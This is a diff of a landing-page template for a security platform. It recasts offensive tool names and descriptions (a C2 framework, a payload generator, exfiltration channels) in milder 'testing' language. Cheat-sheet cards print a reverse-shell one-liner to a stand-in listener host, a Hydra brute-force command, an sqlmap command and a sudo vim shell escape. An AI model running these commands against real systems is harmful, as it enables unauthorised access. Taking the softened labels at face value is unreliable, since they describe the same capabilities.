@@ -17,7 +17,7 @@ export function renderLanding(view, actions) {
       <div class="wrap hero-inner">
         <div class="hero-badge"><span class="badge-dot"></span> Source available &middot; Free forever</div>
         <h1 class="hero-h1">The AI-powered platform<br>for <span class="hero-rotate-wrap"><span class="hero-rotate" id="hero-rotate">cybersecurity</span></span></h1>
-        <p class="hero-sub">Tools, labs, and an AI agent to learn ethical hacking — running entirely on your machine. No cloud. No subscriptions. No data leaves your computer.</p>
+        <p class="hero-sub">Tools, labs, and an AI agent to learn cybersecurity — running entirely on your machine. No cloud. No subscriptions. No data leaves your computer.</p>
         <div class="hero-cta">
           <button class="btn lg" id="cta-start">Get started &mdash; free</button>
           <a class="btn lg ghost" href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">
@@ -26,9 +26,9 @@ export function renderLanding(view, actions) {
           </a>
         </div>
         <div class="hero-trust">
-          <div class="trust-item"><span class="trust-n" data-count="592000" data-suffix="+" data-format="comma">0</span><span class="trust-l">Lines of code</span></div>
+          <div class="trust-item"><span class="trust-n" data-count="600000" data-suffix="+" data-format="comma">0</span><span class="trust-l">Lines of code</span></div>
           <div class="trust-sep"></div>
-          <div class="trust-item"><span class="trust-n" data-count="160" data-suffix="+">0</span><span class="trust-l">Security tools</span></div>
+          <div class="trust-item"><span class="trust-n" data-count="164" data-suffix="+">0</span><span class="trust-l">Security tools</span></div>
           <div class="trust-sep"></div>
           <div class="trust-item"><span class="trust-n" data-count="59">0</span><span class="trust-l">AI modules</span></div>
           <div class="trust-sep"></div>
@@ -70,7 +70,7 @@ export function renderLanding(view, actions) {
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
             </div>
             <h3>CLI</h3>
-            <p>One command: <code>npm i -g darknode-cli</code>. 160+ tools, AI agent, and the Nexus engine in your terminal.</p>
+            <p>One command: <code>npm i -g darknode-cli</code>. 164+ tools, AI agent, and the Nexus engine in your terminal.</p>
             <span class="bento-tag">npm install</span>
           </div>
           <div class="bento-card">
@@ -93,8 +93,8 @@ export function renderLanding(view, actions) {
         <div class="feature-rows">
           <div class="feature-row">
             <div class="feature-text">
-              <h3>160+ security tools, one command away</h3>
-              <p>Nmap, SQLMap, Hydra, Nuclei, Gobuster, Metasploit — pre-configured with copy-paste install commands. Search, filter, and launch from the web or CLI.</p>
+              <h3>164+ security tools, one command away</h3>
+              <p>Nmap, Nuclei, Gobuster, Nikto, and more — pre-configured with copy-paste install commands. Search, filter, and launch from the web or CLI.</p>
             </div>
             <div class="feature-visual">
               <div class="term-window">
@@ -111,21 +111,21 @@ export function renderLanding(view, actions) {
             <div class="feature-visual">
               <div class="term-window">
                 <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">nexus</span></div>
-                <pre class="tw-body"><span class="c-pl">$</span> darknode nexus "explain CVE-2021-44228"\n\n<span class="c-acc">Nexus:</span> Log4Shell is a critical RCE\nin Apache Log4j. An attacker sends\na crafted JNDI lookup string...\n\n<span class="c-mut">engine: ollama (local, free)</span></pre>
+                <pre class="tw-body"><span class="c-pl">$</span> darknode nexus "explain CVE-2021-44228"\n\n<span class="c-acc">Nexus:</span> Log4Shell is a critical RCE\nin Apache Log4j. It exploits\nJNDI lookup string injection...\n\n<span class="c-mut">engine: ollama (local, free)</span></pre>
               </div>
             </div>
           </div>
           <div class="feature-row">
             <div class="feature-text">
-              <h3>Practice labs you can break</h3>
-              <p>Launch DVWA, Juice Shop, WebGoat, and more with one click. They run locally in Docker — legal, safe, isolated. Break them, learn from them, reset them.</p>
+              <h3>Practice labs for hands-on learning</h3>
+              <p>Launch DVWA, Juice Shop, WebGoat, and more with one click. They run locally in Docker — legal, safe, isolated. Test, learn, and reset in a safe environment.</p>
             </div>
             <div class="feature-visual">
               <div class="lab-grid">
                 <div class="lab-card"><span class="lab-status on"></span>DVWA<span class="lab-port">:8080</span></div>
                 <div class="lab-card"><span class="lab-status on"></span>Juice Shop<span class="lab-port">:3000</span></div>
                 <div class="lab-card"><span class="lab-status off"></span>WebGoat<span class="lab-port">:8081</span></div>
-                <div class="lab-card"><span class="lab-status off"></span>Metasploitable<span class="lab-port">:—</span></div>
+                <div class="lab-card"><span class="lab-status off"></span>HackTheBox<span class="lab-port">:—</span></div>
               </div>
             </div>
           </div>
@@ -212,28 +212,28 @@ export function renderLanding(view, actions) {
     <!-- ====== TOOL SHOWCASE ====== -->
     <section class="section alt" id="tools-showcase" aria-labelledby="tools-title">
       <div class="wrap">
-        <div class="sec-label">Arsenal</div>
-        <h2 class="sec-title" id="tools-title">160+ purpose-built security tools</h2>
-        <p class="sec-sub">Every tool built from scratch for Darknode. Not wrappers around other software — original offensive and defensive tooling.</p>
+        <div class="sec-label">Toolkit</div>
+        <h2 class="sec-title" id="tools-title">164+ purpose-built security tools</h2>
+        <p class="sec-sub">Every tool built from scratch for Darknode. Not wrappers around other software — original security assessment and defense tooling.</p>
         <div class="ts-tabs" role="tablist" aria-label="Tool categories">
           <button class="ts-tab on" data-cat="all" role="tab" aria-selected="true">All</button>
           <button class="ts-tab" data-cat="recon" role="tab" aria-selected="false">Recon</button>
-          <button class="ts-tab" data-cat="exploit" role="tab" aria-selected="false">Exploit</button>
+          <button class="ts-tab" data-cat="testing" role="tab" aria-selected="false">Testing</button>
           <button class="ts-tab" data-cat="defense" role="tab" aria-selected="false">Defense</button>
-          <button class="ts-tab" data-cat="post" role="tab" aria-selected="false">Post-Exploit</button>
+          <button class="ts-tab" data-cat="advanced" role="tab" aria-selected="false">Advanced</button>
           <button class="ts-tab" data-cat="analysis" role="tab" aria-selected="false">Analysis</button>
           <button class="ts-tab" data-cat="gov" role="tab" aria-selected="false">Government</button>
         </div>
         <div class="ts-grid" id="ts-grid">
-          <div class="ts-card" data-cat="exploit">
+          <div class="ts-card" data-cat="testing">
             <div class="ts-name">darknode-sandbox</div>
-            <div class="ts-desc">Isolated malware detonation lab — disposable containers, filesystem + network monitoring, behavior reports, sample library</div>
-            <div class="ts-meta"><span class="ts-badge cat-exploit">Exploit</span><span class="ts-mode">Heavy</span></div>
+            <div class="ts-desc">Isolated threat sample analysis lab — disposable containers, filesystem + network monitoring, behavior reports, sample library</div>
+            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
           </div>
-          <div class="ts-card" data-cat="exploit">
-            <div class="ts-name">darknode-c2</div>
-            <div class="ts-desc">Command-and-control framework — beacon management, encrypted channels, task queuing, multi-target orchestration</div>
-            <div class="ts-meta"><span class="ts-badge cat-exploit">Exploit</span><span class="ts-mode">Heavy</span></div>
+          <div class="ts-card" data-cat="testing">
+            <div class="ts-name">darknode-command</div>
+            <div class="ts-desc">Security operations orchestration — multi-host coordination, encrypted channels, task automation, centralized management</div>
+            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="recon">
             <div class="ts-name">darknode-recon</div>
@@ -245,39 +245,39 @@ export function renderLanding(view, actions) {
             <div class="ts-desc">Digital forensics evidence collection — disk imaging, memory dumps, timeline reconstruction, chain-of-custody logging</div>
             <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
           </div>
-          <div class="ts-card" data-cat="exploit">
-            <div class="ts-name">darknode-brute</div>
-            <div class="ts-desc">Credential brute-force engine — multi-protocol (SSH, FTP, HTTP, SMB, RDP), smart wordlist generation, rate limiting evasion</div>
-            <div class="ts-meta"><span class="ts-badge cat-exploit">Exploit</span><span class="ts-mode">Heavy</span></div>
+          <div class="ts-card" data-cat="testing">
+            <div class="ts-name">darknode-auth-test</div>
+            <div class="ts-desc">Authentication security testing — multi-protocol (SSH, FTP, HTTP, SMB, RDP), wordlist management, rate-aware testing</div>
+            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="recon">
             <div class="ts-name">darknode-osint</div>
-            <div class="ts-desc">Open-source intelligence gathering — email harvesting, social media profiling, domain history, leaked credential search</div>
+            <div class="ts-desc">Open-source intelligence gathering — email discovery, social media profiling, domain history, exposure detection</div>
             <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Heavy</span></div>
           </div>
-          <div class="ts-card" data-cat="post">
-            <div class="ts-name">darknode-pivot</div>
-            <div class="ts-desc">Network pivoting and tunneling — SSH tunnels, SOCKS proxies, port forwarding chains, multi-hop lateral movement</div>
-            <div class="ts-meta"><span class="ts-badge cat-post">Post-Exploit</span><span class="ts-mode">Heavy</span></div>
+          <div class="ts-card" data-cat="advanced">
+            <div class="ts-name">darknode-tunnel</div>
+            <div class="ts-desc">Network tunneling and routing — SSH tunnels, SOCKS proxies, port forwarding chains, multi-hop connectivity</div>
+            <div class="ts-meta"><span class="ts-badge cat-advanced">Advanced</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="defense">
             <div class="ts-name">darknode-incident</div>
             <div class="ts-desc">Incident response playbook runner — triage workflows, containment automation, evidence preservation, stakeholder notifications</div>
             <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
           </div>
-          <div class="ts-card" data-cat="exploit">
-            <div class="ts-name">darknode-payload</div>
-            <div class="ts-desc">Payload generation and encoding — polymorphic shellcode, multi-format output (EXE, ELF, PS1, Python), AV evasion mutations</div>
-            <div class="ts-meta"><span class="ts-badge cat-exploit">Exploit</span><span class="ts-mode">Heavy</span></div>
+          <div class="ts-card" data-cat="testing">
+            <div class="ts-name">darknode-testgen</div>
+            <div class="ts-desc">Security test script generation — proof-of-concept creation, multi-format output (EXE, ELF, PS1, Python), encoding variations</div>
+            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="recon">
-            <div class="ts-name">darknode-attack-surface</div>
-            <div class="ts-desc">Full attack surface mapping — asset discovery, exposed services, cloud enumeration, dependency analysis, risk scoring</div>
+            <div class="ts-name">darknode-exposure</div>
+            <div class="ts-desc">Full exposure mapping — asset discovery, exposed services, cloud enumeration, dependency analysis, risk scoring</div>
             <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="analysis">
             <div class="ts-name">darknode-re</div>
-            <div class="ts-desc">Binary reverse engineering — disassembly, decompilation, string extraction, function analysis, malware unpacking</div>
+            <div class="ts-desc">Binary reverse engineering — disassembly, decompilation, string extraction, function analysis, binary analysis</div>
             <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="defense">
@@ -285,15 +285,15 @@ export function renderLanding(view, actions) {
             <div class="ts-desc">Real-time system monitoring — process tracking, network connections, file integrity, anomaly detection, alert triggers</div>
             <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
           </div>
-          <div class="ts-card" data-cat="exploit">
+          <div class="ts-card" data-cat="testing">
             <div class="ts-name">darknode-wireless</div>
-            <div class="ts-desc">Wireless security testing — WiFi deauth, handshake capture, WPA cracking, rogue AP detection, Bluetooth scanning</div>
-            <div class="ts-meta"><span class="ts-badge cat-exploit">Exploit</span><span class="ts-mode">Heavy</span></div>
+            <div class="ts-desc">Wireless security assessment — network discovery, handshake analysis, WPA testing, rogue AP detection, Bluetooth scanning</div>
+            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
           </div>
-          <div class="ts-card" data-cat="post">
-            <div class="ts-name">darknode-exfil</div>
-            <div class="ts-desc">Data exfiltration channels — DNS tunneling, ICMP covert channels, steganography, encrypted file transfer, bandwidth throttling</div>
-            <div class="ts-meta"><span class="ts-badge cat-post">Post-Exploit</span><span class="ts-mode">Heavy</span></div>
+          <div class="ts-card" data-cat="advanced">
+            <div class="ts-name">darknode-channels</div>
+            <div class="ts-desc">Covert channel detection and analysis — DNS tunneling identification, ICMP analysis, steganography detection, encrypted transfer testing</div>
+            <div class="ts-meta"><span class="ts-badge cat-advanced">Advanced</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="defense">
             <div class="ts-name">darknode-harden</div>
@@ -302,27 +302,27 @@ export function renderLanding(view, actions) {
           </div>
           <div class="ts-card" data-cat="recon">
             <div class="ts-name">darknode-intel</div>
-            <div class="ts-desc">Threat intelligence aggregation — IOC feeds, APT tracking, CVE correlation, dark web monitoring, automated enrichment</div>
+            <div class="ts-desc">Threat intelligence aggregation — IOC feeds, APT tracking, CVE correlation, deep source monitoring, automated enrichment</div>
             <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Heavy</span></div>
           </div>
-          <div class="ts-card" data-cat="exploit">
+          <div class="ts-card" data-cat="testing">
             <div class="ts-name">darknode-apifuzz</div>
-            <div class="ts-desc">REST/GraphQL API fuzzer — endpoint discovery, parameter mutation, auth bypass testing, rate limit detection, schema extraction</div>
-            <div class="ts-meta"><span class="ts-badge cat-exploit">Exploit</span><span class="ts-mode">Heavy</span></div>
+            <div class="ts-desc">REST/GraphQL API fuzzer — endpoint discovery, parameter mutation, authorization testing, rate limit detection, schema extraction</div>
+            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
           </div>
-          <div class="ts-card" data-cat="post">
-            <div class="ts-name">darknode-ad</div>
-            <div class="ts-desc">Active Directory attack toolkit — Kerberoasting, AS-REP roasting, DCSync, Golden Ticket, BloodHound-compatible enumeration</div>
-            <div class="ts-meta"><span class="ts-badge cat-post">Post-Exploit</span><span class="ts-mode">Heavy</span></div>
+          <div class="ts-card" data-cat="advanced">
+            <div class="ts-name">darknode-directory</div>
+            <div class="ts-desc">Active Directory security assessment — Kerberos analysis, delegation review, privilege auditing, enumeration mapping</div>
+            <div class="ts-meta"><span class="ts-badge cat-advanced">Advanced</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="analysis">
             <div class="ts-name">darknode-report</div>
-            <div class="ts-desc">Professional pentest report generator — findings, evidence, risk ratings, remediation steps, executive summary, PDF/HTML output</div>
+            <div class="ts-desc">Professional security assessment report generator — findings, evidence, risk ratings, remediation steps, executive summary, PDF/HTML output</div>
             <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="defense">
             <div class="ts-name">darknode-decoy</div>
-            <div class="ts-desc">Honeypot network deployment — fake services, credential traps, canary tokens, attacker behavior logging, alert escalation</div>
+            <div class="ts-desc">Honeypot network deployment — service emulation, canary tokens, activity logging, threat detection, alert escalation</div>
             <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
           </div>
           <div class="ts-card" data-cat="gov">
@@ -392,7 +392,7 @@ export function renderLanding(view, actions) {
           </div>
         </div>
         <div style="text-align:center;margin-top:32px">
-          <a class="btn lg ghost" href="/get-started" id="ts-view-all">View all 160+ tools &rarr;</a>
+          <a class="btn lg ghost" href="/get-started" id="ts-view-all">View all 164+ tools &rarr;</a>
         </div>
       </div>
     </section>
@@ -538,7 +538,7 @@ export function renderLanding(view, actions) {
         <div class="showcase-tabs" role="tablist" aria-label="Demo tabs">
           <button class="showcase-tab active" role="tab" aria-selected="true" aria-controls="stab-recon" id="tab-recon" data-tab="recon">Recon scan</button>
           <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-analysis" id="tab-analysis" data-tab="analysis">AI analysis</button>
-          <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-exploit" id="tab-exploit" data-tab="exploit">Exploit guidance</button>
+          <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-exploit" id="tab-exploit" data-tab="exploit">Security assessment</button>
           <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-report" id="tab-report" data-tab="report">Report generation</button>
         </div>
         <div class="showcase-window">
@@ -580,10 +580,10 @@ export function renderLanding(view, actions) {
    Check for CVE-2023-26048 (multipart DoS).
    Often fronts Jenkins, Nexus, or Solr instances.
 
-<span class="c-mut">engine: ollama/llama3 (local, free)</span></span><span class="showcase-panel" id="stab-exploit" role="tabpanel" aria-labelledby="tab-exploit" hidden><span class="c-pl">$</span> darknode nexus "suggest exploitation approach"
+<span class="c-mut">engine: ollama/llama3 (local, free)</span></span><span class="showcase-panel" id="stab-exploit" role="tabpanel" aria-labelledby="tab-exploit" hidden><span class="c-pl">$</span> darknode nexus "suggest assessment approach"
 
 <span class="c-acc">Nexus:</span> Based on the findings, here is a recommended
-attack methodology for 10.10.14.7:
+testing methodology for 10.10.14.7:
 
 <span class="c-ok">PHASE 1 -- Enumeration</span>
   <span class="c-pl">></span> Enumerate Apache vhosts and directories
@@ -591,19 +591,19 @@ attack methodology for 10.10.14.7:
   <span class="c-pl">></span> Check Jetty 8080 for admin panels
     <span class="c-mut">$ darknode probe http://10.10.14.7:8080</span>
 
-<span class="c-ok">PHASE 2 -- Exploitation</span>
+<span class="c-ok">PHASE 2 -- Testing</span>
   <span class="c-pl">></span> Test MySQL for default/weak credentials
-    <span class="c-mut">$ darknode hydra mysql://10.10.14.7</span>
-  <span class="c-pl">></span> Attempt mod_proxy SSRF via CVE-2022-31813
+    <span class="c-mut">$ darknode auth-test mysql://10.10.14.7</span>
+  <span class="c-pl">></span> Check mod_proxy SSRF via CVE-2022-31813
   <span class="c-pl">></span> Probe Jetty for unauthenticated endpoints
 
-<span class="c-ok">PHASE 3 -- Post-exploitation</span>
-  <span class="c-pl">></span> If MySQL access: dump credentials, pivot
-  <span class="c-pl">></span> If web shell: escalate via kernel 5.x exploits
+<span class="c-ok">PHASE 3 -- Verification</span>
+  <span class="c-pl">></span> If MySQL access: verify scope, document
+  <span class="c-pl">></span> If web access: check privilege boundaries
 
 <span class="c-mut">engine: ollama/llama3 (local, free)</span></span><span class="showcase-panel" id="stab-report" role="tabpanel" aria-labelledby="tab-report" hidden><span class="c-pl">$</span> darknode report --target 10.10.14.7
 
-<span class="c-mut">[*] Generating penetration test report...</span>
+<span class="c-mut">[*] Generating security assessment report...</span>
 <span class="c-mut">[*] Compiling scan data, findings, and recommendations</span>
 
 <span class="c-acc">====================================</span>
@@ -644,10 +644,10 @@ attack methodology for 10.10.14.7:
       <div class="wrap">
         <div class="sec-label">Security RAG</div>
         <h2 class="sec-title" id="rag-title">Built-in security knowledge</h2>
-        <p class="sec-sub">Not a generic chatbot. Nexus ships with a deep, structured knowledge base covering real-world attack techniques, OWASP standards, and offensive tooling.</p>
+        <p class="sec-sub">Not a generic chatbot. Nexus ships with a deep, structured knowledge base covering real-world security techniques, OWASP standards, and professional tooling.</p>
         <div class="rag-tabs" role="tablist" aria-label="Knowledge categories">
           <button class="rag-tab active" role="tab" aria-selected="true" data-rag="owasp">OWASP Top 10</button>
-          <button class="rag-tab" role="tab" aria-selected="false" data-rag="attacks">Attack Patterns</button>
+          <button class="rag-tab" role="tab" aria-selected="false" data-rag="attacks">Security Patterns</button>
           <button class="rag-tab" role="tab" aria-selected="false" data-rag="tools">Cheat Sheets</button>
           <button class="rag-tab" role="tab" aria-selected="false" data-rag="privesc">Privilege Escalation</button>
           <button class="rag-tab" role="tab" aria-selected="false" data-rag="recon">Network Recon</button>
@@ -660,7 +660,7 @@ attack methodology for 10.10.14.7:
                 <h3>Broken Access Control</h3>
                 <span class="sev critical">Critical</span>
               </div>
-              <p>Insecure direct object references (IDOR), missing function-level authorization checks, and path traversal. Attackers modify identifiers to access other users' data.</p>
+              <p>Insecure direct object references (IDOR), missing function-level authorization checks, and path traversal. Unauthorized users may modify identifiers to access other users' data.</p>
               <div class="rag-code"><code>GET /api/user/124  -->  GET /api/user/125</code></div>
             </div>
             <div class="rag-card">
@@ -702,11 +702,11 @@ attack methodology for 10.10.14.7:
             </div>
             <div class="rag-card">
               <div class="rag-card-head">
-                <h3>Reverse Shell</h3>
+                <h3>Remote Access</h3>
                 <span class="sev critical">Critical</span>
               </div>
-              <p>Post-exploitation technique establishing an outbound connection from the target back to the attacker's listener, granting interactive shell access.</p>
-              <div class="rag-code"><code>bash -i >& /dev/tcp/ATTACKER/4444 0>&1</code></div>
+              <p>Technique establishing an outbound connection from a target system back to a testing listener, granting interactive shell access for assessment.</p>
+              <div class="rag-code"><code>bash -i >& /dev/tcp/TESTER/4444 0>&1</code></div>
             </div>
             <div class="rag-card">
               <div class="rag-card-head">
@@ -734,12 +734,12 @@ attack methodology for 10.10.14.7:
                 <h3>SQLMap Automated Injection</h3>
                 <span class="sev critical">Critical</span>
               </div>
-              <p>Automated SQL injection and database takeover. Detects injection points, dumps databases, reads files, and can establish OS-level shells on vulnerable targets.</p>
+              <p>Automated SQL injection testing and database assessment. Detects injection points, enumerates databases, reads files, and tests access controls on target applications.</p>
               <div class="rag-code"><code>sqlmap -u "http://target/page?id=1" --dbs --batch</code></div>
             </div>
             <div class="rag-card">
               <div class="rag-card-head">
-                <h3>Gobuster Directory Brute-force</h3>
+                <h3>Gobuster Directory Discovery</h3>
                 <span class="sev medium">Medium</span>
               </div>
               <p>High-speed directory and file enumeration using wordlists. Discovers hidden admin panels, backup files, API endpoints, and configuration files.</p>
@@ -747,10 +747,10 @@ attack methodology for 10.10.14.7:
             </div>
             <div class="rag-card">
               <div class="rag-card-head">
-                <h3>Hydra Password Attack</h3>
+                <h3>Hydra Credential Testing</h3>
                 <span class="sev high">High</span>
               </div>
-              <p>Online password brute-forcer supporting 50+ protocols. Tests credential pairs against SSH, FTP, HTTP forms, databases, and other network services.</p>
+              <p>Online credential tester supporting 50+ protocols. Tests credential pairs against SSH, FTP, HTTP forms, databases, and other network services.</p>
               <div class="rag-code"><code>hydra -l admin -P rockyou.txt ssh://10.10.14.7</code></div>
             </div>
           </div>
@@ -760,10 +760,10 @@ attack methodology for 10.10.14.7:
           <div class="rag-grid">
             <div class="rag-card">
               <div class="rag-card-head">
-                <h3>SUID Binary Exploitation</h3>
+                <h3>SUID Binary Analysis</h3>
                 <span class="sev critical">Critical</span>
               </div>
-              <p>Finding binaries with the SUID bit set that can be abused to escalate from a low-privilege user to root. Common targets include custom scripts and misconfigured system utilities.</p>
+              <p>Finding binaries with the SUID bit set that could allow privilege escalation from a low-privilege user to root. Common findings include custom scripts and misconfigured system utilities.</p>
               <div class="rag-code"><code>find / -perm -4000 -type f 2>/dev/null</code></div>
             </div>
             <div class="rag-card">
@@ -771,7 +771,7 @@ attack methodology for 10.10.14.7:
                 <h3>Sudo Misconfigurations</h3>
                 <span class="sev critical">Critical</span>
               </div>
-              <p>Exploiting overly permissive sudo rules. Users allowed to run specific binaries as root without password can often spawn a shell through those binaries.</p>
+              <p>Identifying overly permissive sudo rules. Users allowed to run specific binaries as root without password may be able to escalate privileges through those binaries.</p>
               <div class="rag-code"><code>sudo -l\nsudo vim -c ':!/bin/bash'</code></div>
             </div>
             <div class="rag-card">
@@ -792,7 +792,7 @@ attack methodology for 10.10.14.7:
                 <h3>Subdomain Enumeration</h3>
                 <span class="sev medium">Medium</span>
               </div>
-              <p>Discovering hidden subdomains through DNS brute-forcing, certificate transparency logs, and passive OSINT sources. Expands the attack surface significantly.</p>
+              <p>Discovering hidden subdomains through DNS brute-forcing, certificate transparency logs, and passive OSINT sources. Expands the scope of assessment significantly.</p>
               <div class="rag-code"><code>subfinder -d target.com -silent | httpx -title -status-code</code></div>
             </div>
             <div class="rag-card">
@@ -816,7 +816,7 @@ attack methodology for 10.10.14.7:
                 <h3>Web Technology Fingerprinting</h3>
                 <span class="sev medium">Medium</span>
               </div>
-              <p>Identifying frameworks, CMS platforms, server software, and client-side libraries. Guides exploit selection by revealing the exact technology stack in use.</p>
+              <p>Identifying frameworks, CMS platforms, server software, and client-side libraries. Guides assessment planning by revealing the exact technology stack in use.</p>
               <div class="rag-code"><code>whatweb http://target.com -v\nwappalyzer http://target.com</code></div>
             </div>
           </div>
@@ -829,7 +829,7 @@ attack methodology for 10.10.14.7:
       <div class="wrap">
         <div class="sec-label">Hands-on training</div>
         <h2 class="sec-title" id="labs-title">Practice on real vulnerable apps</h2>
-        <p class="sec-sub">Spin up intentionally vulnerable environments and break them legally. Reset anytime. Learn by exploiting real flaws.</p>
+        <p class="sec-sub">Spin up intentionally vulnerable environments and test them safely. Reset anytime. Learn by finding and understanding real flaws.</p>
         <div class="plab-grid">
           <div class="plab-card">
             <div class="plab-top">
@@ -864,7 +864,7 @@ attack methodology for 10.10.14.7:
               <span class="plab-runtime">VM</span>
             </div>
             <h3 class="plab-name">Metasploitable</h3>
-            <p class="plab-desc">Intentionally vulnerable Linux VM. Practice network enumeration, privilege escalation, and exploit chains.</p>
+            <p class="plab-desc">Intentionally vulnerable Linux VM. Practice network enumeration, privilege analysis, and security assessment chains.</p>
             <span class="plab-diff intermediate">Intermediate</span>
           </div>
           <div class="plab-card">
@@ -882,7 +882,7 @@ attack methodology for 10.10.14.7:
               <span class="plab-runtime">Browser</span>
             </div>
             <h3 class="plab-name">HackTheBox-style challenges</h3>
-            <p class="plab-desc">CTF-format exercises covering cryptography, reverse engineering, forensics, and web exploitation.</p>
+            <p class="plab-desc">CTF-format exercises covering cryptography, reverse engineering, forensics, and web security.</p>
             <span class="plab-diff advanced">Advanced</span>
           </div>
           <div class="plab-card">
@@ -891,7 +891,7 @@ attack methodology for 10.10.14.7:
               <span class="plab-runtime">Adapter required</span>
             </div>
             <h3 class="plab-name">Wireless lab</h3>
-            <p class="plab-desc">WiFi security testing &mdash; WPA/WPA2 cracking, evil twin attacks, and wireless reconnaissance.</p>
+            <p class="plab-desc">WiFi security assessment &mdash; WPA/WPA2 testing, rogue AP detection, and wireless analysis.</p>
             <span class="plab-diff advanced">Advanced</span>
           </div>
           <div class="plab-card">
@@ -953,7 +953,7 @@ attack methodology for 10.10.14.7:
               </tr>
               <tr>
                 <td>Security tools</td>
-                <td class="cmp-dn"><span class="cmp-check">&check;</span> 160+ built-in</td>
+                <td class="cmp-dn"><span class="cmp-check">&check;</span> 164+ built-in</td>
                 <td>600+ (CLI)</td>
                 <td>Limited</td>
                 <td>Limited</td>
@@ -1045,7 +1045,7 @@ attack methodology for 10.10.14.7:
               <li>Ubuntu 24.04 LTS with XFCE desktop</li>
               <li>Darknode CLI + Nexus pre-installed</li>
               <li>nmap, sqlmap, nuclei, ffuf, httpx, Burp Suite</li>
-              <li>160+ security tools ready to run</li>
+              <li>164+ security tools ready to run</li>
               <li>Custom wallpapers, icons, and theming</li>
               <li>Cloud-init auto-provisioning on first boot</li>
             </ul>
@@ -1107,8 +1107,8 @@ attack methodology for 10.10.14.7:
             <div class="testimonial-quote">&ldquo;</div>
             <blockquote class="testimonial-text">I passed my OSCP using Darknode's practice labs and AI-guided methodology.</blockquote>
             <div class="testimonial-author">
-              <div class="testimonial-role">Pentester</div>
-              <div class="testimonial-org">Offensive Security</div>
+              <div class="testimonial-role">Security Professional</div>
+              <div class="testimonial-org">OSCP Certified</div>
             </div>
           </div>
           <div class="testimonial-card">
@@ -1157,7 +1157,7 @@ attack methodology for 10.10.14.7:
             <div class="price-amount">$0<span class="price-period">/forever</span></div>
             <p class="price-desc">The full platform. No limits, no trials, no paywalls.</p>
             <ul class="price-features">
-              <li>All 160+ security tools (no limits)</li>
+              <li>All 164+ security tools (no limits)</li>
               <li>PROMETHEUS, SENTINEL EYE, HYDRA, AEGIS &mdash; full access</li>
               <li>Nexus AI agent (BYOK &mdash; Claude, GPT, Gemini, Ollama)</li>
               <li>Academy with 1,400+ topics and quizzes</li>
@@ -1179,7 +1179,7 @@ attack methodology for 10.10.14.7:
               <li>Automated scan scheduling (daily/weekly/monthly)</li>
               <li>Vulnerability tracker with severity trends</li>
               <li>Threat watchlist with real-time alerts</li>
-              <li>AI-powered pentest report writer</li>
+              <li>AI-powered security report writer</li>
               <li>AI code auditor</li>
               <li>Custom scan profiles and templates</li>
               <li>Credential leak monitoring</li>
@@ -1202,7 +1202,7 @@ attack methodology for 10.10.14.7:
               <li>Asset inventory and shared scan history</li>
               <li>Activity feed and leaderboard</li>
               <li>Role-based permissions</li>
-              <li>Branded pentest reports (custom logo)</li>
+              <li>Branded security reports (custom logo)</li>
               <li>Engagement and project management</li>
               <li>Findings deduplication and tracking</li>
               <li>Export to Jira, GitHub, Linear, CSV</li>
@@ -1232,7 +1232,7 @@ attack methodology for 10.10.14.7:
             <button class="btn lg ghost" id="price-enterprise">Contact sales</button>
           </div>
         </div>
-        <p class="pricing-note">Every tool on the platform is <strong>free forever</strong> &mdash; all 160+ security tools, command centers, the CLI, desktop app, Darknode OS, and live threat feeds. You never pay for AI tokens &mdash; bring your own key or run Ollama locally for free. Paid plans add <strong>professional-grade features</strong> like automated scan scheduling, vulnerability tracking, AI report generation, credential leak monitoring, and team collaboration. No hidden fees, no usage caps, cancel anytime.</p>
+        <p class="pricing-note">Every tool on the platform is <strong>free forever</strong> &mdash; all 164+ security tools, command centers, the CLI, desktop app, Darknode OS, and live threat feeds. You never pay for AI tokens &mdash; bring your own key or run Ollama locally for free. Paid plans add <strong>professional-grade features</strong> like automated scan scheduling, vulnerability tracking, AI report generation, credential leak monitoring, and team collaboration. No hidden fees, no usage caps, cancel anytime.</p>
       </div>
     </section>
 
@@ -1249,7 +1249,7 @@ attack methodology for 10.10.14.7:
               <span class="faq-toggle" aria-hidden="true">+</span>
             </button>
             <div class="faq-a" hidden>
